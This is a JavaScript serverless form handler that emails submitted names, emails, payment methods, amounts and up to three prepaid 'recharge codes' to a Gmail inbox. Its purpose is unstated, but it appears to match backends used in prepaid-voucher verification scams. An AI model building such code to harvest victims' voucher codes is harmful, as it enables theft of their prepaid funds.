const nodemailer = require("nodemailer");

function json(statusCode, body) {
  return {
    statusCode,
    headers: { "Content-Type": "application/json; charset=utf-8" },
    body: JSON.stringify(body),
  };
}

function escapeHtml(value) {
  return String(value ?? "—")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return json(405, { error: "Méthode non autorisée" });
  }

  try {
    const body = JSON.parse(event.body || "{}");
    const fullName = String(body.fullName || "").trim();
    const email = String(body.email || "").trim();
    const paymentMethod = String(body.paymentMethod || "").trim();
    const amount = Number(body.amount);
    const rechargeCodes = Array.isArray(body.rechargeCodes)
      ? body.rechargeCodes.map((code) => String(code || "").trim()).filter(Boolean).slice(0, 3)
      : [];
    const consent = body.consent === true;

    if (!fullName || !email || !paymentMethod || !Number.isFinite(amount) || amount <= 0 || !rechargeCodes.length || !consent) {
      return json(400, { error: "Champs requis manquants" });
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return json(400, { error: "Adresse e-mail invalide" });
    }

    const emailUser = process.env.EMAIL_USER;
    const emailPass = process.env.EMAIL_PASS;
    const emailTo = process.env.EMAIL_TO || emailUser;

    if (!emailUser || !emailPass) {
      console.error("EMAIL_USER ou EMAIL_PASS manquant dans les variables Netlify");
      return json(503, { error: "Envoi d'e-mail non configuré" });
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: { user: emailUser, pass: emailPass },
    });

    const info = await transporter.sendMail({
      from: emailUser,
      to: emailTo,
      replyTo: email,
      subject: "Nouvelle soumission de recharge",
      html: `
        <h2>Détails de la soumission</h2>
        <p><strong>Nom complet :</strong> ${escapeHtml(fullName)}</p>
        <p><strong>Email :</strong> ${escapeHtml(email)}</p>
        <p><strong>Moyen de paiement :</strong> ${escapeHtml(paymentMethod)}</p>
        <p><strong>Montant :</strong> ${escapeHtml(amount)}</p>
        ${rechargeCodes.map((code, index) => `<p><strong>Code ${index + 1} :</strong> ${escapeHtml(code)}</p>`).join("")}
        <p><strong>Consentement :</strong> Oui</p>
      `,
    });

    return json(200, { success: true, messageId: info.messageId });
  } catch (error) {
    if (error instanceof SyntaxError) {
      return json(400, { error: "Corps de requête invalide" });
    }

    console.error("Erreur d'envoi d'e-mail :", error?.message || error);
    return json(500, { error: "Échec de l'envoi d'e-mail" });
  }
};
